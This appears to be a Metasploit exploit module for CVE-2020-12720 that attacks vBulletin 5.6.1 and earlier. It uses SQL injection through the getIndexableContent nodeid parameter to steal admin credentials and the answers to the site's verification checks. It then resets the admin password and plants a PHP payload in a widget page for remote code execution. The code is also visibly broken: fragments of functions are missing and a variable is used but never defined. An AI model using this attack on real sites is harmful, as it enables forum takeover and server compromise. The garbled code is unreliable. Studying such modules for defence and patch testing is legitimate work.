# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::AutoCheck

  HttpFingerprint = { method: &#039;GET&#039;, uri: &#039;/&#039;, pattern: [/vBulletin.version = &#039;5.+&#039;/] }

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection&#039;,
        &#039;Description&#039; => %q{
          This module exploits a SQL injection vulnerability found in vBulletin 5.6.1 and earlier
          This module uses the getIndexableContent vulnerability to reset the administrators password,
          it then uses the administrators login information to achieve RCE on the target. This module
          has been tested successfully on VBulletin Version 5.6.1 on Ubuntu Linux distribution.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; => [
          &#039;Charles Fol <folcharles[at]gmail.com>&#039;, # (@cfreal_) CVE
          &#039;Zenofex <zenofex[at]exploitee.rs>&#039;, # (@zenofex) PoC and Metasploit module
        ],
        &#039;References&#039; => [
          [&#039;CVE&#039;, &#039;2020-12720&#039;],
        ],
        &#039;Platform&#039; => &#039;php&#039;,
        &#039;Arch&#039; => ARCH_PHP,
        &#039;Targets&#039; => [
          [&#039;Automatic&#039;, {}]
        ],
        &#039;Privileged&#039; => false,
        &#039;DisclosureDate&#039; => &#039;2020-03-12&#039;,
        &#039;DefaultTarget&#039; => 0
      )
    )
    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to vBulletin&#039;, &#039;/&#039;]),
      OptInt.new(&#039;NODE&#039;, [false, &#039;Valid Node ID&#039;]),
      OptInt.new(&#039;MINNODE&#039;, [true, &#039;Valid Node ID&#039;, 1]),
      OptInt.new(&#039;MAXNODE&#039;, [true, &#039;Valid Node ID&#039;, 200]),
      OptBool.new(&#039;MANUALLOSTPASS&#039;, [false, &#039;true if an administrator lost password request has already been sent.&#039;, false])
    ])
  end

  # Performs SQLi attack
  def do_sqli(node_id, tbl_prfx, field, table, condition)
    where_cond = condition.nil? || condition == &#039;&#039; ? &#039;&#039; : "where #{condition}"
    injection = " UNION ALL SELECT 0x2E,0x74,0x68,0x65,0x2E,0x65,0x78,0x70,0x6C,0x6F,0x69,0x74,0x65,0x65,0x72,0x73,0x2E,#{field},0x2E,0x7A,0x65,0x6E,0x6F,0x66,0x65,0x78 "
    injection << "from #{tbl_prfx}#{table} #{where_cond}--"

    print_status("Performing SQL injection on target to retrieve &#039;#{field}&#039; from &#039;#{tbl_prfx}#{table}&#039;.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;content_infraction&#039;, &#039;getIndexableContent&#039;),
      &#039;vars_post&#039; => {
        &#039;nodeId[nodeid]&#039; => "#{node_id}#{injection}"
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp[&#039;rawtext&#039;]

    parsed_resp[&#039;rawtext&#039;]
  end

  # Gets human verification token
  def get_hv_hash
    print_status("Making request to &#039;#{target_uri.path}/ajax/api/hv/generateToken&#039; to retrieve HV token.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;hv&#039;, &#039;generateToken&#039;),
      &#039;vars_post&#039; => {
        &#039;securitytoken&#039; => &#039;guest&#039;
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp[&#039;hash&#039;]

    hv_hash = parsed_resp[&#039;hash&#039;]
    print_good("Retrieved &#039;#{hv_hash}&#039; human verification token.")
    hv_hash
  end

  # Gets the human verification (question based) answer
  def get_hv_ques_answer(node_id, tbl_prfx, questionid)
    print_status("Using HV token &#039;#{questionid}&#039; and SQLinjection to determine HV question answer.")
    hv_answer = do_sqli(node_id, tbl_prfx, &#039;regex&#039;, &#039;hvquestion&#039;, "questionid = &#039;#{questionid}&#039;")

    if questionid.nil?
      return nil
    end

    print_good("Retrieved the answer &#039;#{hv_answer}&#039; (REGEX) to the HV question with id &#039;#{questionid}&#039;.")
    hv_answer
  end

  # Gets the human verification (image based) answer
  def get_hv_answer(node_id, tbl_prfx, hv_hash)
    print_status("Using HV token &#039;#{hv_hash}&#039; and SQLinjection to determine HV answer.")
    hv_answer = do_sqli(node_id, tbl_prfx, &#039;answer&#039;, &#039;humanverify&#039;, "hash = &#039;#{hv_hash}&#039;")

    if hv_answer.nil?
      return nil
    end

    print_good("Retrieved &#039;#{hv_answer}&#039; answer to HV token &#039;#{hv_hash}&#039;.")
    hv_answer
  end

    table_name = do_sqli(node_id, &#039;&#039;, &#039;table_name&#039;, &#039;information_schema.columns&#039;, "column_name=&#039;phrasegroup_cppermission&#039;")

    unless table_name && table_name.split(&#039;language&#039;).index
    end


  end

  # Sends the request to begin forgot password request
  def begin_reset_pass(admin_email, hv_answer, hv_hash, type = &#039;Image&#039;)
    print_status("Making request to &#039;#{target_uri.path}/auth/lostpw&#039; to begin lost password process.")
    if type == &#039;Question&#039;
      hv_field_name1 = &#039;humanverify[input]&#039;
      hv_field_name2 = &#039;humanverify[hash]&#039;
    elsif type == &#039;Recaptcha2&#039;
      hv_field_name1 = &#039;unused&#039;
      hv_field_name2 = &#039;humanverify[g-recaptcha-response]&#039;
    else
      hv_field_name1 = &#039;humanverify[input]&#039;
      hv_field_name2 = &#039;humanverify[hash]&#039;
    end

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;auth&#039;, &#039;lostpw&#039;),
      &#039;vars_post&#039; => {
        &#039;email&#039; => admin_email.to_s,
        hv_field_name1.to_s => hv_answer.to_s,
        hv_field_name2.to_s => hv_hash.to_s,
        &#039;securitytoken&#039; => &#039;guest&#039;
      }
    })

    return false unless res && res.code == 200

    parsed_resp = res.get_json_document

    return false if parsed_resp[&#039;response&#039;] && parsed_resp[&#039;response&#039;][&#039;errors&#039;]

    true
  end

  # Attempts to login to vBulletin install
  def login(user, pass, type = &#039;&#039;)
    print_status("Making login request to &#039;#{target_uri.path}/auth/ajax-login&#039; with username: &#039;#{user}&#039; and password: &#039;#{pass}&#039;.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;auth&#039;, &#039;ajax-login&#039;),
      &#039;vars_post&#039; => {
        &#039;logintype&#039;: type.to_s,
        &#039;username&#039; => user.to_s,
        &#039;password&#039; => pass.to_s,
        &#039;securitytoken&#039; => &#039;guest&#039;
      }
    })

    return [nil, nil] unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp[&#039;success&#039;]

    print_good("Successfully logged in as #{user} #{type}.")

    [res.get_cookies, parsed_resp[&#039;newtoken&#039;]]
  end

  # Gets an administrator&#039;s info from the database using SQLi

    unless uid && username && token && email
      return [nil, nil, nil, nil]
    end

    [uid, username, token, email]
  end

  # Activates vBulletin site builder
  def activate_sitebuilder(pageid, nodeid, userid, sec_token, cookie_jar)
    print_status("Making request to &#039;#{target_uri.path}/ajax/activate-sitebuilder&#039; to activate site-builder functionality.")

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;activate-sitebuilder&#039;),
      &#039;cookie&#039; => [cookie_jar],
      &#039;headers&#039; => {
        &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;
      },
      &#039;vars_post&#039; => {
        &#039;pageid&#039; => pageid.to_s,
        &#039;nodeid&#039; => nodeid.to_s,
        &#039;userid&#039; => userid.to_s,
        &#039;loadMenu&#039; => &#039;false&#039;,
        &#039;isAjaxTemplateRender&#039; => &#039;true&#039;,
        &#039;isAjaxTemplateRenderWithData&#039; => &#039;true&#039;,
        &#039;securitytoken&#039; => sec_token.to_s
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp[&#039;errors&#039;]

    print_good(&#039;Successfully enabled site-builder functionality.&#039;)
    true
  end

  # Creates new widget instance
  def new_widget_instance(sec_token, cookie_jar)
    print_status("Making request to &#039;#{target_uri.path}/ajax/api/widget/saveNewWidgetInstance&#039; to create new widget.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;widget&#039;, &#039;saveNewWidgetInstance&#039;),
      &#039;cookie&#039; => [cookie_jar],
      &#039;vars_post&#039; => {
        &#039;containerinstanceid&#039; => &#039;0&#039;,
        &#039;widgetid&#039; => &#039;23&#039;, # PHP widget type ID
        &#039;pagetemplateid&#039; => &#039;&#039;,
        &#039;securitytoken&#039; => sec_token.to_s
      }
    })

    return [nil, nil] unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp[&#039;widgetinstanceid&#039;]

    print_good(&#039;Created new widget instance.&#039;)

    [parsed_resp[&#039;widgetinstanceid&#039;], parsed_resp[&#039;pagetemplateid&#039;]]
  end

  # Saves a new widget to vBulletin.
  def save_widget(pt_id, wi_id, payload, sec_token, cookie_jar)
    print_status("Making request to &#039;#{target_uri.path}/ajax/api/widget/saveAdminConfig&#039; to add payload to widget.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;widget&#039;, &#039;saveAdminConfig&#039;),
      &#039;cookie&#039; => [cookie_jar],
      &#039;vars_post&#039; => {
        &#039;widgetid&#039; => &#039;23&#039;, # PHP widget type ID
        &#039;pagetemplateid&#039; => pt_id.to_s,
        &#039;widgetinstanceid&#039; => wi_id.to_s,
        &#039;data[widget_type]&#039; => &#039;&#039;,
        &#039;data[title]&#039; => rand_text_alphanumeric(rand(6..16)),
        &#039;data[show_at_breakpoints][desktop]&#039; => &#039;1&#039;,
        &#039;data[show_at_breakpoints][small]&#039; => &#039;1&#039;,
        &#039;data[show_at_breakpoints][xsmall]&#039; => &#039;1&#039;,
        &#039;data[hide_title]&#039; => &#039;1&#039;,
        &#039;data[module_viewpermissions][key]&#039; => &#039;show_all&#039;,
        &#039;data[code]&#039; => payload.encoded.to_s,
        &#039;securitytoken&#039; => sec_token.to_s
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp[&#039;errors&#039;]

    print_good(&#039;Successfully added payload to widget.&#039;)

    true
  end

  # Sends request to reset password using activation id.
  def reset_password(admin_uid, act_id, new_pass)
    print_status("Sending reset password request to &#039;#{target_uri.path}/auth/reset-password&#039;.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;auth&#039;, &#039;reset-password&#039;),
      &#039;headers&#039; => {
        &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;
      },
      &#039;vars_post&#039; => {
        &#039;userid&#039; => admin_uid.to_s,
        &#039;activationid&#039; => act_id.to_s,
        &#039;new-password&#039; => new_pass.to_s,
        &#039;new-password-confirm&#039; => new_pass.to_s,
        &#039;securitytoken&#039; => &#039;guest&#039;
      }
    })

    unless res && res.code == 200 && res.body.to_s =~ /Logging in/
      return nil
    end

    print_good("User with userid &#039;#{admin_uid}&#039; successfully reset password to &#039;#{new_pass}&#039;.")

    true
  end

  # Deletes a page in vbulletin
  def delete_page(pageid, login_token, cookie_jar)
    print_status("Sending delete page request to &#039;#{target_uri.path}/ajax/api/page/delete&#039;.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;page&#039;, &#039;delete&#039;),
      &#039;cookie&#039; => [cookie_jar],
      &#039;headers&#039; => {
        &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;
      },
      &#039;vars_post&#039; => {
        &#039;pageid&#039; => pageid.to_s,
        &#039;securitytoken&#039; => login_token.to_s
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp[&#039;errors&#039;]

    print_good("Successfully deleted page with pageid: #{pageid}")

    true
  end

  # Makes request to execute PHP payload.
  def exec_payload(rest_url)
    print_status("Sending request to &#039;#{normalize_uri(target_uri.path, rest_url)}&#039; to execute payload.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, rest_url)
    })

    unless res && res.code == 200
      return nil
    end

    print_good(&#039;Request made succesfully, payload should be executing now.&#039;)

    true
  end

  # Fetches a human verification question based on hash.
  def get_hv_question(hash)
    print_status("Sending request to &#039;#{target_uri.path}/ajax/api/hv/fetchHvQuestion&#039; to get human verification question.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;hv&#039;, &#039;fetchHvQuestion&#039;),
      &#039;vars_post&#039; => {
        &#039;hash&#039; => hash.to_s
      }
    })

    unless res && res.code == 200 && res.body.to_s !~ /"errors"/
      return nil
    end

    res.body.to_s.tr(&#039;"&#039;, &#039;&#039;)
  end

  # Saves a new page to the vBulletin install
  def save_page(nodeid, userid, pt_id, payload_url, wi_id, session_info)
    print_status("Sending request to &#039;#{target_uri.path}/admin/savepage&#039; to save new page at &#039;#{payload_url}&#039;.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;savepage&#039;),
      &#039;cookie&#039; => [session_info[1]],
      &#039;vars_post&#039; => {
        &#039;input[ishomeroute]&#039; => &#039;0&#039;,
        &#039;input[pageid]&#039; => &#039;0&#039;,
        &#039;input[nodeid]&#039; => nodeid.to_s,
        &#039;input[userid]&#039; => userid.to_s,
        &#039;input[screenlayoutid]&#039; => &#039;2&#039;,
        &#039;input[templatetitle]&#039; => rand_text_alphanumeric(rand(5..10)),
        &#039;input[displaysections[0]]&#039; => &#039;[]&#039;,
        &#039;input[displaysections[1]]&#039; => &#039;[]&#039;,
        &#039;input[displaysections[2]]&#039; => "[{\"widgetId\":\"23\",\"widgetInstanceId\":\"#{wi_id}\"}]",
        &#039;input[displaysections[3]]&#039; => &#039;[]&#039;,
        &#039;input[pagetitle]&#039; => rand_text_alphanumeric(rand(5..10)),
        &#039;input[resturl]&#039; => payload_url.to_s,
        &#039;input[metadescription]&#039; => rand_text_alphanumeric(rand(5..10)),
        &#039;input[pagetemplateid]&#039; => pt_id.to_s,
        &#039;url&#039; => normalize_uri(target_uri.path),
        &#039;securitytoken&#039; => session_info[0].to_s
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp[&#039;success&#039;]

    print_good("Page succesfully created and should be accessible at &#039;#{normalize_uri(target_uri.path, payload_url.to_s)}&#039;.")

    parsed_resp[&#039;pageid&#039;]
  end

  # Gets human verification type (options: "Question" | "Image" | Recaptcha2 | "Disabled")
  def get_hv_type

    print_status("Sending request to &#039;#{target_uri.path}/ajax/api/hv/fetchHvType&#039; to get human verification type.")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;hv&#039;, &#039;fetchHvType&#039;)
    })

    unless res && res.code == 200
      return nil
    end

    hv_type = res.body.to_s.tr(&#039;"&#039;, &#039;&#039;)
    print_good("Retrieved HV/captcha type of &#039;#{hv_type}&#039;.")

    hv_type.to_s.tr("&#039;", &#039;&#039;)
  end

  # Brute force a nodeid (attack requires a valid nodeid)
  def brute_force_node
    min = datastore[&#039;MINNODE&#039;]
    max = datastore[&#039;MAXNODE&#039;]

    if min > max
      print_error("MINNODE can&#039;t be major than MAXNODE.")
      return nil
    end

    for node_id in min..max
      if exists_node?(node_id)
        return node_id
      end
    end

    nil
  end

  # Checks if a nodeid is valid
  def exists_node?(id)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;api&#039;, &#039;node&#039;, &#039;getNode&#039;),
      &#039;vars_post&#039; => {
        &#039;nodeid&#039; => id.to_s
      }
    })

    unless res && res.code == 200
      return nil
    end

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp[&#039;errors&#039;]

    print_good("Sucessfully found node at id #{id}")
    true
  end

  # Gets a node through BF or user supplied value
  def get_node
    if datastore[&#039;NODE&#039;].nil? || datastore[&#039;NODE&#039;] <= 0
      print_status(&#039;Brute forcing to find a valid node id.&#039;)
      return brute_force_node
    end

    print_status("Checking node id &#039;#{datastore[&#039;NODE&#039;]}&#039;.")
    return datastore[&#039;NODE&#039;] if exists_node?(datastore[&#039;NODE&#039;])

    nil
  end

  # Check function for exploit
  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;js&#039;, &#039;login.js&#039;)
    })

    return CheckCode::Unknown unless res && res.code == 200

    return CheckCode::Safe if res.body.to_s =~ /vBulletin 5\.6\.1 Patch Level 1/

    if res.body.to_s =~ /vBulletin ([\.0-9]+)/
      if Gem::Version.new(Regexp.last_match(1)) > Gem::Version.new(&#039;5.6.1&#039;)
        return CheckCode::Safe
      elsif Gem::Version.new(Regexp.last_match(1)) > Gem::Version.new(&#039;5.0.0&#039;)
        return CheckCode::Appears
      end

      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  # Performs all exploit functionality
  def exploit
    super

    # Get node_id for requests
    node_id = get_node
    fail_with(Failure::Unknown, &#039;Could not get a valid node id for the vBulletin install.&#039;) unless node_id


    # Get admin info (email, uid, token)
    admin_uid, admin_user, admin_token, admin_email = get_admin_info(node_id, table_prfx)
    unless admin_uid && admin_user && admin_token && admin_email
      fail_with(Failure::UnexpectedReply, &#039;Could not retrieve administrator uid, username, email and token.&#039;)
    end
    print_good("Retrieved administrator uid: #{admin_uid} user: #{admin_user} email: #{admin_email} and password: #{admin_token}")

    if !datastore[&#039;MANUALLOSTPASS&#039;]
      # Determine HV type
      hv_type = get_hv_type

      fail_with(Failure::Unknown, &#039;Invalid human verification type, you must request a new password for the administrator manually (and set MANUALLOSTPASS).&#039;) unless [&#039;Image&#039;, &#039;Question&#039;, &#039;Recaptcha2&#039;, &#039;Disabled&#039;].include? hv_type

      fail_with(Failure::Unknown, "Site uses Recaptcha2, retry with MANUALLOSTPASS enabled and after a lost password request to an administrator account (#{admin_email})") unless [&#039;Recaptcha2&#039;, &#039;Disabled&#039;].exclude? hv_type

      # Generate HV token and get answer
      if hv_type == &#039;Image&#039; && hv_type != &#039;Disabled&#039;
        hv_hash = get_hv_hash
        hv_answer = get_hv_answer(node_id, table_prfx, hv_hash)
        fail_with(Failure::UnexpectedReply, &#039;Could not retrieve human verification hash or answer.&#039;) unless hv_hash && hv_answer

      elsif hv_type == &#039;Question&#039; && hv_type != &#039;Disabled&#039;
        hv_hash = get_hv_hash
        fail_with(Failure::UnexpectedReply, &#039;Could not retrieve human verification question hash.&#039;) unless hv_hash

        ques_id = get_hv_answer(node_id, table_prfx, hv_hash)
        fail_with(Failure::UnexpectedReply, &#039;Could not retrieve human verification question id.&#039;) unless ques_id

        hv_question = get_hv_question(hv_hash)
        hv_answer = get_hv_ques_answer(node_id, table_prfx, ques_id)
        fail_with(Failure::UnexpectedReply, &#039;Could not retrieve human verification question or answer.&#039;) unless hv_question && hv_answer

        print_good("Retrieved the HV question &#039;#{hv_question}&#039; and answer &#039;#{hv_answer}&#039; (regex).")
      end

      # Make request to forget my password
      brp_ret = begin_reset_pass(admin_email, hv_answer, hv_hash, hv_type)

      # We fail here when the answer to the HV question contains a complex regex or is recaptcha2
      fail_with(Failure::Unknown, &#039;Site requires captcha that we cannot bypass.&#039;) unless brp_ret
    end

    # Get Activation ID for forgot password request from DB
    activation_id = do_sqli(node_id, table_prfx, &#039;activationid&#039;, &#039;useractivation&#039;, "userid = &#039;#{admin_uid}&#039;")
    fail_with(Failure::UnexpectedReply, &#039;Could not retrieve activation id for forgot password request.&#039;) unless activation_id

    # Make request setting new password
    new_pass = rand_text_alphanumeric(rand(10..16))
    rp_ret = reset_password(admin_uid, activation_id, new_pass)
    fail_with(Failure::UnexpectedReply, "Error attempting to reset password with activation id &#039;#{activation_id}&#039;.") unless rp_ret

    # Login to vBulletin
    cookie_jar, login_token = login(admin_user, new_pass)
    fail_with(Failure::NoAccess, "Could not login with username: &#039;#{admin_user}&#039; and password: &#039;#{new_pass}&#039;.") unless login_token

    # Activate Site Builder (is this necessary?!)
    actsb_ret = activate_sitebuilder(1, node_id, admin_uid, login_token, cookie_jar)
    fail_with(Failure::UnexpectedReply, &#039;Could not activate site builder.&#039;) unless actsb_ret

    # Login to vBulletin
    cookie_jar, login_token = login(admin_user, new_pass, &#039;cplogin&#039;)
    fail_with(Failure::NoAccess, "Could not login to CP with username: &#039;#{admin_user}&#039; and password: &#039;#{new_pass}&#039;.") unless login_token

    # Create new widget
    wi_id, pt_id = new_widget_instance(login_token, cookie_jar)
    fail_with(Failure::UnexpectedReply, &#039;Could not create new widget instance.&#039;) unless wi_id && pt_id

    # Save modifications to widget
    sw_ret = save_widget(pt_id, wi_id, payload, login_token, cookie_jar)
    fail_with(Failure::UnexpectedReply, &#039;Could not save payload modifications into widget instance.&#039;) unless sw_ret

    # Add page with widget embedded
    payload_url = rand_text_alphanumeric(rand(6..10))
    session_info = [login_token, cookie_jar]
    page_id = save_page(node_id, admin_uid, pt_id, payload_url, wi_id, session_info)
    fail_with(Failure::UnexpectedReply, &#039;Could not save newly created page with malicious widget.&#039;) unless page_id

    # Execute php payload
    print_good("Executing PHP payload (#{payload.encoded.length} bytes) at #{normalize_uri(target_uri.path, payload_url)}.")
    exec_payload(payload_url)

    # Delete page with widget embedded within it
    dp_ret = delete_page(page_id, login_token, cookie_jar)
    print_bad(&#039;Could not delete page (cleanup phase).&#039;) unless dp_ret
  end

end

